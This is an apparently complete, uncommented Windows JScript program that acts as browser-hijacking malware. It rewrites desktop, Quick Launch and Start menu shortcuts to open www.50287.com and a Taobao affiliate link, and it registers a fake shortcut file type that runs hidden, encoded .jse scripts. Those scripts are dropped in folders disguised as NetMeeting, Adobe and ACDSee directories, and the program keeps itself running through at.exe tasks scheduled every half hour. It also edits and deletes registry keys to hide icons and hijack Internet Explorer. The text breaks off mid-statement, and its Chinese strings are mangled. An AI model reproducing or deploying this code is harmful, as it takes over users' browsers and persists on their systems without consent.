var f_AA = new ActiveXObject("WScript.Shell");
var f_AB = new ActiveXObject( "Scripting.FileSystemObject") ;
var f_AC=new ActiveXObject("Scripting.Encoder");
var f_AD = ".pntlu";
var f_AE = "rpvnwne";
var f_AF = ["MAXTHON.EXE", "THEWORLD.EXE",  "IEXPLORE.EXE", "360SE.EXE", "SOGOUEXPLORER.EXE", "TTRAVELER.EXE", "FIREFOX.EXE"];
var f_AG =new Array( "http://www.50287.com","http://www.50287.com","http://www.50287.com","http://www.50287.com","http://www.50287.com","http://www.50287.com","http://www.50287.com");
var f_AH=f_AG[parseInt(Math.random() * f_AG.length)] ;
function CreateFolder(fso,path) 
        {
               if(fso.FolderExists(path))
                {
                    return;
                }

               if (!fso.FolderExists(fso.GetParentFolderName(path)))
               { 
                   CreateFolder(fso,fso.GetParentFolderName(path)); 
               } 
               fso.CreateFolder(path);
        }
var f_AK = function( szDir ){

        var f_AL, f_AN ;
		
        var f_AM = new Array;
		
		f_AL = f_AB.GetFolder(szDir);
			
        f_AN = new Enumerator(f_AL.files) ;
        
        for (; !f_AN.atEnd(); f_AN.moveNext()) {
		
            var file = f_AN.item();
			
			f_AM[f_AM.length] = file ;
			
        }
        return f_AM ;
    };
var f_AO = function( szDir ){

        var f_AL, f_AN ;
		
        var f_AM = new Array;
		
		f_AL = f_AB.GetFolder(szDir);
			
        f_AN = new Enumerator(f_AL.SubFolders) ;

        for (; !f_AN.atEnd(); f_AN.moveNext()) {
		
            var file = f_AN.item();
			
			f_AM[f_AM.length] = file ;
			
        }
        return f_AM ;
};	
function f_AP( objectnameloc , path ,argu, runstatus , desc , iconloc , workdir   ){
    
    f_AQ = f_AA.CreateShortcut(objectnameloc);
	
    f_AQ.TargetPath =path ;
	
	f_AQ.Arguments = argu ;
	
	f_AQ.WindowStyle =runstatus ; 
	
	f_AQ.IconLocation = iconloc;
	
	f_AQ.Description = desc ;
	
	f_AQ.WorkingDirectory = workdir;
	
	f_AQ.Save() ;
	
}
function f_AR( objectnameloc , path   ){

    f_AQ = f_AA.CreateShortcut(objectnameloc);
	
    f_AQ.TargetPath =path ;
	
	f_AQ.Save() ;
	
}
var f_ATS = function(){
f_AU = f_AA.SpecialFolders("Desktop") ;
f_AV = f_AA.SpecialFolders("Favorites") ;
loc=  f_AU +"\\�Ա���ɱ.lnk";
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\tao.ico"))
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" ,"\"http://taobao.ttver.net/?d\"" , 1 , "" ,"C:\\Program Files\\NetMeeting\\Family Safety\\tao.ico, 0" ,"%ProgramFiles%\\Internet Explorer\\") ;
else
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" ,"\"http://taobao.ttver.net/?d\"" , 1 , "" ,"%ProgramFiles%\\Internet Explorer\\IEXPLORE.EXE, 0" ,"%ProgramFiles%\\Internet Explorer\\") ;

loc= f_AU +"\\��ַ֮��.lnk" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" , "\"http://www.50287.com?d\"", 1 , "" ,"%ProgramFiles%\\Internet Explorer\\IEXPLORE.EXE, //0" ,"%ProgramFiles%\\Internet Explorer\\") ;

} ;

var f_AT = function(){
f_AU = f_AA.SpecialFolders("Desktop") ;
f_AV = f_AA.SpecialFolders("Favorites") ;
loc=  f_AU +"\\�Ա���ɱ.lnk";
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
if(f_AB.FileExists("C:\\Program Files\\NetMeeting\\Family Safety\\tao.ico"))
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" ,"\"http://taobao.ttver.net/?d\"" , 1 , "" ,"C:\\Program Files\\NetMeeting\\Family Safety\\tao.ico, 0" ,"%ProgramFiles%\\Internet Explorer\\") ;
else
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" ,"\"http://taobao.ttver.net/?d\"" , 1 , "" ,"%ProgramFiles%\\Internet Explorer\\IEXPLORE.EXE, 0" ,"%ProgramFiles%\\Internet Explorer\\") ;

loc= f_AU +"\\��ַ֮��.lnk" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AP( loc , "%ProgramFiles%\\Internet Explorer\\iexplore.exe" , "\"http://www.50287.com?d\"", 1 , "" ,"%ProgramFiles%\\Internet Explorer\\IEXPLORE.EXE, //0" ,"%ProgramFiles%\\Internet Explorer\\") ;

loc=  f_AV + "\\�Ա���ɱ.url" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AR( loc , "http://taobao.ttver.net/?f" ) ;

loc=  f_AV + "\\��ַ֮��.url" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AR( loc , "http://www.50287.com/?f" ) ;
f_AB.DeleteFile(f_AV+"\\����\\*.url") ;

loc=  f_AV + "\\����\\�Ա���ɱ.url" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AR( loc , "http://taobao.ttver.net/?f" ) ;

loc=  f_AV + "\\����\\��ַ֮��.url" ;
f_AA.Run('cmd.exe /C del /f /q  '+'"'+loc+'"' , 0 , true ) ;
f_AR( loc , "http://www.50287.com/?f" ) ;
} ;
var f_AW = function(szDir){
var f_AM = f_AK( szDir ) ;
for( ma=0 ; ma< f_AM.length ; ma++){
   var f_AIName = f_AM[ma] ;   
   var f_AX = "" ;   
   f_AX += f_AIName ;   
   var f_AY  = f_AB.GetBaseName(f_AX);   
   f_AY = f_AY.toUpperCase() ;   
   if( f_AY.indexOf("INT")!=-1  || f_AY.indexOf(".URL")!=-1){   
		var file = f_AB.GetFile( f_AX) ;		
		file.attributes = 32;		
		f_AB.DeleteFile( f_AX ) ;
   }
}
} ;
var f_AZ = function(){
var X = f_AA.Environment("PROCESS");
var W = X("USERPROFILE");
var f_CC = W + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
f_AW( f_CC ) ;
} ;
var f_CH = function(){
var f_AIData = 'var f_AA = new ActiveXObject("WScript.Shell") ;\r\nvar s =new Array();\r\ns.push("http://www.50287.com");s.push("http://www.50287.com");s.push("http://www.50287.com");s.push("http://www.50287.com");s.push("http://www.50287.com");s.push("http://www.50287.com");s.push("http://www.50287.com");\r\n var sn=s[parseInt(Math.random() * s.length)] ;\r\nf_AA.Run("cmd.exe /C start iexplore "+sn, 0, false) ;\r\nWScript.Sleep(2000);\r\nf_AA.Run(\'wscript.exe  /B  "'+'C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse'.replace( /\\/g , "\\\\")+'"\', 0, true) ;\r\nWScript.Quit() ;\r\n' ;
var szEncodeData=f_AC.EncodeScriptFile(".js",f_AIData,0,"JScript");
CreateFolder(f_AB,"C:\\Program Files\\Windows Media Player\\Media Renderer");
sF= f_AB.OpenTextFile( "C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse",2,true) ; 
sF.Write(szEncodeData) ;
sF.Close() ;
} ;
var f_CI = function(){
var f_CJ ="HKEY_CLASSES_ROOT\\CLSID\\{1f4de370-d627-11d1-ba4f-00a0c91eedba}\\" ;
var f_CK = new Array(
f_CJ, "REG_SZ" , "" ,
f_CJ+"InfoTip" , "REG_SZ" , "@shdoclc.dll,-880" ,
f_CJ+"LocalizedString" , "REG_SZ" , "@shdoclc.dll,-880" ,
f_CJ+"DefaultIcon\\" , "REG_EXPAND_SZ" , "shdoclc.dll,0" ,
f_CJ+"InProcServer32\\" , "REG_SZ" , "%%systemRoot%%\\system32\\shdocvw.dll" ,
f_CJ+"InProcServer32\\ThreadingModel" , "REG_SZ" , "Apartment" ,
f_CJ+"shell\\" , "REG_SZ" , "����ҳ" ,
f_CJ+"shell\\����ҳ\\MUIVerb" , "REG_SZ" , "@shdoclc.dll,-10241" ,
f_CJ+"shell\\����ҳ\\Command\\" , "REG_SZ" , "wscript.exe /B \"C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse\"" ,
f_CJ+"shell\\����(&R)\\Command\\" , "REG_SZ" , "rundll32.exe shell32.dll,Control_RunDLL INETCPL.CPL,,0" ,
f_CJ+"ShellFolder\\Attributes" , "REG_DWORD" , 0 ,
f_CJ+"ShellFolder\\HideFolderVerbs" , "REG_SZ" , "" ,
f_CJ+"ShellFolder\\HideOnDesktopPerUser" , "REG_SZ" , "" ,
f_CJ+"ShellFolder\\WantsParsDisplayName" , "REG_SZ" , "" 
) ;
for( i=0 ; i<f_CK.length/3 ; i++){
   f_AA.RegWrite( f_CK[3*i] , f_CK[3*i+2] , f_CK[3*i+1])  ;   
}
} ;
var f_CL = function(){
var f_CN = "" ;
if(f_AB.FileExists("C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a"))
f_CN+= 'copy "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\a" "C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse"' ;
f_CN+= '\r\n' ; 
if(f_AB.FileExists("C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\b"))
f_CN+= 'copy "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\b" "C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse" ' ; 
f_CN+= '\r\n' ; 
if(f_AB.FileExists("C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\c"))
f_CN+= 'copy "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\c" "C:\\Program Files\\Windows Media Player\\Media Renderer\\fdjbkbs.jse" ' ; 
f_CN+= '\r\n' ; 
if(f_AB.FileExists("C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\d"))
f_CN+= 'copy "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\d" "C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\����\\hfldmdu.jse"' ;
f_CN+= '\r\n' ;    
f_CN+= 'REG ADD "HKEY_CLASSES_ROOT\\rpvnwne\\shell\\open\\command" /ve /t REG_SZ /d "WScript.exe /B """C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse""" """%%1"""" /f' ;
f_CN += '\r\n' ; 
CreateFolder(f_AB,"C:\\Program Files\\Adobe\\Adobe Extension Manager CSW");
f_CO= f_AB.OpenTextFile( "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\s.cmd" ,2,true) ; 
f_CO.Write(f_CN) ;
f_CO.Close() ;
var f_CP = "" ;
var cmdline1 ='cmd.exe /c at /delete /yes' ;
f_CP += cmdline1 ;
f_CP += '\r\n' ;
for( var k=0 ; k<23 ; k++ ){
var cmdline2 ='at.exe '+ k+':30' +'  /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\s.cmd" ' ;
f_CP += cmdline2 ;
f_CP += '\r\n' ;
var cmdline3 ='at.exe '+ k+':00' +'  /every:Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday  "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\s.cmd" ' ;
f_CP += cmdline3 ;
f_CP += '\r\n' ;
}
f_CQ = f_AB.OpenTextFile( "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\1.cmd" , 2 ,true ) ;
f_CQ.Write( f_CP ) ;
f_CQ.Close() ;
f_AA.Run( 'cmd.exe /c "C:\\Program Files\\Adobe\\Adobe Extension Manager CSW\\1.cmd"' , 0, false ) ;
} ;
var f_RunOthersProgram =function(){
	f_AA.Run( 'wscript.exe /B '+'"C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse"' ,0 , false ) ;	
} ;
var f_CS = function(){
var f_CR ='var f_AA = new ActiveXObject("WScript.Shell") ;\r\nf_AA.Run(\'wscript.exe  /B  "'+'C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse'.replace( /\\/g , "\\\\")+'"\', 0, true) ;\r\nf_AA.Run(\'wscript.exe  /B  "'+'C:\\Program Files\\ACD Systems\\ACDSee Trial Version\\jhnfofw.jse'.replace( /\\/g , "\\\\")+'"\', 0, false) ;\r\nWScript.Quit() ;\r\n' ;
var f_CT=f_AC.EncodeScriptFile(".js",f_CR,0,"JScript");
CreateFolder(f_AB,"C:\\Program Files\\NetMeeting\\Family Safety");
f_CU= f_AB.OpenTextFile( "C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse" ,2,true) ; 
f_CU.Write(f_CT) ;
f_CU.Close() ;
f_AA.Run('cmd.exe /C copy "C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse" "%USERPROFILE%\\����ʼ���˵�\\����\\����\\hfldmdu.jse"' , 0 ,false ) ;
f_AA.Run('cmd.exe /C copy "C:\\Program Files\\NetMeeting\\Family Safety\\hfldmdu.jse" "%ALLUSERSPROFILE%\\����ʼ���˵�\\����\\����\\hfldmdu.jse"' , 0 ,false ) ;
} ;
 var f_GetAllCurUserNamespace = function(){ 
			var szRootKey = 2147483649; 		
			sRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace";		
            oLoc = new ActiveXObject("WbemScripting.SWbemLocator");			
            oSvc = oLoc.ConnectServer(null, "root\\default");
	    oReg = oSvc.Get("StdRegProv");		
            oMethod = oReg.Methods_.Item("EnumKey");	
            oInParam = oMethod.InParameters.SpawnInstance_();	
            oInParam.hDefKey = szRootKey;	
            oInParam.sSubKeyName = sRegPath;	
            oOutParam = oReg.ExecMethod_(oMethod.Name, oInParam);	
            return oOutParam.sNames.toArray() ;	
};	
var f_FixLnkFileRegedit = function(){
var arLnkInfo = new Array( 
"HKEY_CLASSES_ROOT\\.lnk\\", "REG_SZ" , "lnkfile" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\{000214EE-0000-0000-C000-000000000046}\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\{000214F9-0000-0000-C000-000000000046}\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\{00021500-0000-0000-C000-000000000046}\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellEx\\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellNew\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\.lnk\\ShellNew\\Command", "REG_SZ" , "rundll32.exe appwiz.cpl,NewLinkHere %1" 
) ;
for( i=0 ; i<arLnkInfo.length/3 ; i++){
   f_AA.RegWrite( arLnkInfo[3*i] , arLnkInfo[3*i+2] , arLnkInfo[3*i+1])  ;   
}
var f_CV = new Array( 
"HKEY_CLASSES_ROOT\\lnkfile\\", "REG_SZ" , "��ݷ�ʽ" , 
"HKEY_CLASSES_ROOT\\lnkfile\\EditFlags", "REG_DWORD" , 1 , 
"HKEY_CLASSES_ROOT\\lnkfile\\IsShortcut", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\NeverShowExt", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\CLSID\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\ContextMenuHandlers\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\ContextMenuHandlers\\{00021401-0000-0000-C000-000000000046}\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\ContextMenuHandlers\\Offline Files\\", "REG_SZ" , "{750fdf0e-2a26-11d1-a3ea-080036587f03}" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\DropHandler\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\IconHandler\\", "REG_SZ" , "{00021401-0000-0000-C000-000000000046}" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\PropertySheetHandlers\\", "REG_SZ" , "" , 
"HKEY_CLASSES_ROOT\\lnkfile\\shellex\\PropertySheetHandlers\\ShimLayer Property Page\\", "REG_SZ" , "{513D916F-2A8E-4F51-AEAB-0CBC76FB1AF8}" 
) ;
for( J=0 ; J<f_CV.length/3 ; J++){
   f_AA.RegWrite( f_CV[3*J] , f_CV[3*J+2] , f_CV[3*J+1])  ;   
}

f_AA.RegWrite( "HKEY_CLASSES_ROOT\\lnkfile\\shell\\open\\command\\" ,   "" ,"REG_SZ") ;
f_AA.RegDelete("HKEY_CLASSES_ROOT\\lnkfile\\shell\\open\\command\\") ;
f_AA.RegDelete("HKEY_CLASSES_ROOT\\lnkfile\\shell\\open\\") ;
f_AA.RegDelete("HKEY_CLASSES_ROOT\\lnkfile\\shell\\") ;
}
var f_CX=function( szDir  , f_CY ){
var f_AM = f_AK( szDir ) ;
for( ma=0 ; ma< f_AM.length ; ma++){
   var f_AIName = f_AM[ma] ;   
   f_AIType = f_AB.GetExtensionName( f_AIName) ;   
   f_AIType = '.'+f_AIType.toUpperCase() ;   
   if( f_AIType!=".LNK"&& f_AIType!=".EXE"  && f_AIType!=f_CY ){   
        var szValue = f_AA.RegRead("HKEY_CLASSES_ROOT\\"+f_AIType+"\\") ;
		if( szValue!=""){
			var szValueB = f_AA.RegRead("HKEY_CLASSES_ROOT\\"+szValue+"\\") ;
			if( szValueB!= "" && szValueB=="��ݷ�ʽ"){
			  var file = f_AB.GetFile( f_AIName) ;
			  file.attributes = 32;
			  f_AB.DeleteFile( f_AIName ) ;
			  
	}}}
    if( f_AIType==".URL" ){
	   var file = f_AB.GetFile( f_AIName) ;  
	   file.attributes = 32;
	   f_AB.DeleteFile( f_AIName) ;  
	}
	if( f_AIType == ".LNK" ){
	   var f_AQ = f_AA.CreateShortcut(f_AIName);
	   var f_CW = f_AQ.TargetPath ;
	   f_CW = f_CW.toUpperCase() ;
	   if( f_CW.indexOf("::")!= -1  || f_CW.indexOf(".VBS")!=-1 || f_CW==""  ){
	       var file = f_AB.GetFile( f_AIName) ;   
		   file.attributes = 32;
		   f_AB.DeleteFile( f_AIName ) ;
		   
}}}

}


var f_FixOtherLnkFile = function(szlinkexclude){
var f_CY = szlinkexclude.toUpperCase() ;
var f_CA = f_AA.SpecialFolders("Desktop");
f_CX( f_CA , f_CY) ;
var f_CB = f_AA.SpecialFolders("AllUsersDesktop");
f_CX( f_CB , f_CY) ;
var X = f_AA.Environment("PROCESS");
var W = X("USERPROFILE");
var f_CC = W + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
f_CX( f_CC , f_CY) ;
var X = f_AA.Environment("PROCESS");
var W = X("USERPROFILE");
var f_CD = W + "\\����ʼ���˵�";
f_CX( f_CD , f_CY) ;
var X = f_AA.Environment("PROCESS");
var W = X("USERPROFILE");
var f_CE = W + "\\����ʼ���˵�\\����";
f_CX( f_CE , f_CY) ;
var X = f_AA.Environment("PROCESS");
var W = X("ALLUSERSPROFILE");
var f_CF = W + "\\����ʼ���˵�";
f_CX( f_CF , f_CY) ;
var X = f_AA.Environment("PROCESS");
var W = X("ALLUSERSPROFILE");
var f_CG = W + "\\����ʼ���˵�\\����";
f_CX( f_CG , f_CY) ;
} ;
var f_OthersScheduleJob = function(){
s= f_AB.OpenTextFile('C:\\Program Files\\winzip',2,true) ;
s.Write("1") ;
s.Close() ;
}
var f_GetAllNamespace = function(){
        var szRootKey = 2147483650;		
        sRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace";    
        oLoc = new ActiveXObject("WbemScripting.SWbemLocator");		
        oSvc = oLoc.ConnectServer(null, "root\\default");		
        oReg = oSvc.Get("StdRegProv");		
        oMethod = oReg.Methods_.Item("EnumKey");		
        oInParam = oMethod.InParameters.SpawnInstance_();		
        oInParam.hDefKey = szRootKey;		
        oInParam.sSubKeyName = sRegPath;		
        oOutParam = oReg.ExecMethod_(oMethod.Name, oInParam);		
        return oOutParam.sNames.toArray() ;		
};	
var f_SearchElement = function(elment , arElements){   
        for (var i = 0; i < arElements.length; i++) {		
            if (arElements[i] == elment) {			
                return true				
            }			
        }		
        return false
};
var f_DeleteNotSysNamespace = function(){
			var arCurNamespace = f_GetAllNamespace();	
            var nIndex;
            var arSysNamespace = ["{1f4de370-d627-11d1-ba4f-00a0c91eedba}", "{450D8FBA-AD25-11D0-98A8-0800361B1103}", "{645FF040-5081-101B-9F08-00AA002F954E}", "{e17d4fc0-5564-11d1-83f2-00a0c90dc849}"];
 	    for (nIndex = 0; nIndex < arSysNamespace.length; nIndex++) {	   
                arSysNamespace[nIndex] = arSysNamespace[nIndex].toUpperCase() ;			
            }		
            for (nIndex = 0; nIndex < arCurNamespace.length; nIndex++) {		
                arCurNamespace[nIndex] = arCurNamespace[nIndex].toUpperCase();			
            }   
			for (nIndex = 0; nIndex < arCurNamespace.length; nIndex++) {		
                if (!f_SearchElement(arCurNamespace[nIndex], arSysNamespace)) {		                          
                    f_AA.RegDelete("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\" + arCurNamespace[nIndex] + "\\")
				}		
            }
			
};
var f_HideIEDesktopIcon = function(){
    f_AA.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoInternetIcon", 1, "REG_DWORD")
    f_AA.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartPage\\Favorites", 255, "REG_BINARY")
    f_AA.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu\\{871C5380-42A0-1069-A2EA-08002B30309D}", 1, "REG_DWORD")
    f_AA.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\{871C5380-42A0-1069-A2EA-08002B30309D}", 1, "REG_DWORD")    
};
var f_IsExistScriptArguments = function(){
        var colitems = WScript.Arguments;	
        if (colitems.length == 0) {	
            return false		
        }
        else {	
            return true		
        }	
};

var f_IsIEProcess = function(f_AIName){
        var f_AINameUpper = f_AIName.toUpperCase();	
        for (var nIndex in f_AF) {	
            if (f_AINameUpper.indexOf(f_AF[nIndex]) > 0) {		
                return true			
            }		
        }	
        return false	
};	
var f_GetTypedFiles = function( szFolder , szExtName){  
            var f_AM = new Array();		
            var colitems  = f_AB.GetFolder(szFolder);		
            oenumerator = new Enumerator(colitems.files);		
            var szSearchExtType = szExtName.toUpperCase();		
            for (; !oenumerator.atEnd(); oenumerator.moveNext()) {		
                var filename = oenumerator.item();		
				var  f_AIName = "" ;
				f_AIName += filename;
				f_AIName = f_AIName.toUpperCase();				
                if ((f_AIName.match(szSearchExtType + "$") == szSearchExtType)) {				
                    f_AM[f_AM.length] = f_AIName;					
                }				
            }			
            return f_AM;      
};
var f_CreateNewFile = function(f_AIFullPathName, szTargetPath, szPara, szIconFile){   
            var f_CZ= f_AB.CreateTextFile(f_AIFullPathName, true);			
            f_CZ.WriteLine("[360]");			
            f_CZ.WriteLine("Found=All");			
            f_CZ.WriteLine("Name=___" + escape(szTargetPath) + "___");			
            f_CZ.WriteLine("Tel=<<<" + escape(szPara) + ">>>");			
            f_CZ.WriteLine("[InternetShortcut]");			
            f_CZ.WriteLine("URL=http://www.baidu.com");			
            f_CZ.WriteLine("IconIndex=0");			
            f_CZ.WriteLine("IconFile=" + szIconFile);			
            f_CZ.Close()       
};
var f_CreateNewTypeFile_Reg = function(){
            f_AA.RegWrite("HKCR\\" + f_AD + "\\", f_AE, "REG_SZ");			
            f_AA.RegWrite("HKCR\\" + f_AE + "\\", "��ݷ�ʽ", "REG_SZ");			
            f_AA.RegWrite("HKCR\\" + f_AE + "\\IsShortcut", "", "REG_SZ");			
            f_AA.RegWrite("HKCR\\" + f_AE + "\\NeverShowExt", "", "REG_SZ");			
            f_AA.RegWrite("HKCR\\" + f_AE + "\\DefaultIcon\\", "%SystemRoot%\\system32\\url.dll,0", "REG_EXPAND_SZ");            
			f_AA.RegWrite("HKCR\\" + f_AE + "\\CLSID\\", "{FBF23B40-E3F0-101B-8488-00AA003E56F8}", "REG_SZ");            
			f_AA.RegWrite("HKCR\\" + f_AE + "\\shell\\", "open", "REG_SZ");            
			f_AA.RegWrite("HKCR\\" + f_AE + "\\shell\\open\\CLSID", "{FBF23B40-E3F0-101B-8488-00AA003E56F8}", "REG_SZ");            
			f_AA.RegWrite("HKCR\\" + f_AE + "\\shell\\open\\command\\", 'WScript.exe /B "C:\\Program Files\\NetMeeting\\Family Safety\\dbhzizq.jse" "%1"', "REG_SZ");	    
			f_AA.RegWrite("HKCR\\" + f_AE + "\\shellex\\IconHandler\\", "{FBF23B40-E3F0-101B-8488-00AA003E56F8}", "REG_SZ");            
			f_AA.RegWrite("HKCR\\" + f_AE + "\\shellex\\ContextMenuHandlers\\", "", "REG_SZ")       
};
var f_CopyFile= function(szSourceFile , szDestFile){
    f_AB.CopyFile(szSourceFile, szDestFile) ;	
};
var f_FileHandleSchedule = function(f_AIName){
        var fstream = f_AB.OpenTextFile(f_AIName, 1);		
        var f_AIData = fstream.ReadAll();		
        var regular_exepath = /___(.*?)___/ig;		
        var regular_param = /<<<(.*?)>>>/ig;		
        var f_DA, szParam;		
        if (regular_exepath.test(f_AIData)) {		
            f_DA = RegExp.$1;			
            f_DA = unescape(f_DA) ;			
        }		
        if (regular_param.test(f_AIData)) {		
            szParam = RegExp.$1;			
            szParam = unescape(szParam);			
        }
		
        if (f_DA != "") {		
            if (f_IsIEProcess(f_DA) && 
			  f_AIName.indexOf("��ַ֮��") == -1 &&
			  f_AIName.indexOf("�Ա���ɱ") == -1 
			 ) {			 
				szParam = '"' + f_AH + '"' ;				
                f_AA.Run('"' + f_DA + '" ' + szParam, 1, false) ;				
            }
            else {			
                f_AA.Run('"' + f_DA + '" '+szParam, 1, false);				
            }
        }
};
var f_DeleteFile = function( f_AIName ,bSetup ){
           if( bSetup ){

				//szUPFileName = f_AIName.toUpperCase() ;
			
				//szSPFileName = "�����" ;
			
				//szSPFileName = szSPFileName.toUpperCase() ;

				//if( szUPFileName.indexOf(szSPFileName)!=-1 && szUPFileName.indexOf("360") ){
				
				//}
				//else if ( szUPFileName.indexOf( "Internet".toUpperCase() )!=-1 ){
				
				//}
				//else{
			
					var file = f_AB.GetFile(f_AIName);
			
					file.attributes = 32;
			
					f_AB.DeleteFile(f_AIName);
				//}
			
			}else{
			
			   var file = f_AB.GetFile(f_AIName);
			
			   file.attributes = 32;
			
			   f_AB.DeleteFile(f_AIName);
			}
};
var f_DB = function( szFolder , bSetup ){
     var f_AM= f_GetTypedFiles(szFolder, ".LNK");	 
     for (var nIndex in f_AM) {           
                var f_AIName = f_AM[nIndex];				
                var reggular = /\.exe$/ig;				
                var f_AY  = f_AB.GetBaseName(f_AIName);				
                var f_AALink  = f_AA.CreateShortcut(f_AIName);				
                var f_DA  = f_AALink.TargetPath;				
                var szParam  = f_AALink.Arguments;				
                if (f_DA == "") {				
                    continue
                }				
                  if (reggular.test(f_DA) 
				&& f_AIName.toUpperCase().indexOf("�Ա���ɱ")==-1
				&& f_AIName.toUpperCase().indexOf("��ַ֮��")==-1) {				
                    var szNewFileName  = szFolder + "\\" + f_AY + f_AD;					
                    f_CreateNewFile(szNewFileName, f_DA, szParam, f_DA);					
                    f_DeleteFile(f_AIName,bSetup);					
                }
        }
};	
if (!f_IsExistScriptArguments()) {
        f_CreateNewTypeFile_Reg();		
        f_HideIEDesktopIcon();		
        f_DeleteNotSysNamespace();		
		var f_CA = f_AA.SpecialFolders("Desktop");		
		f_DB( f_CA , true  ) ;
		var f_CB = f_AA.SpecialFolders("AllUsersDesktop");		
		f_DB( f_CB , true) ;		
		f_DeleteNotSysNamespace();		
		f_FixLnkFileRegedit();		
		//f_FixOtherLnkFile( ".pntlu");		
		f_CL() ;               		
		f_RunOthersProgram() ;		
		f_CS() ;       		
		f_CI() ;   
		f_CH() ;           
		var X = f_AA.Environment("PROCESS");
		var W = X("USERPROFILE");
		var f_CC = W + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
		f_DB( f_CC, true ) ;
		var X = f_AA.Environment("PROCESS");		
		var W = X("USERPROFILE");		
		var f_CD = W + "\\����ʼ���˵�";		
		f_DB( f_CD , true) ;
		var X = f_AA.Environment("PROCESS");		
		var W = X("USERPROFILE");		
		var f_CD = W + "\\����ʼ���˵�\\����";		
		f_DB( f_CD, true ) ;		
		var f_DD = f_AO( W + "\\����ʼ���˵�\\����");		
		for( var m=0 ; m< f_DD.length ; m++ ){		
		   var f_CD = f_DD[m] ;		   
			f_DB( f_CD,true ) ;			
			var f_DC  = f_AO(f_DD[m] );			
			for( var n=0 ; n< f_DC.length ; n++ ){			
				var f_CD = f_DC[n] ;		   
				f_DB( f_CD,true  ) ;			
			}			
		}	
		var X = f_AA.Environment("PROCESS");		
		var W = X("ALLUSERSPROFILE");		
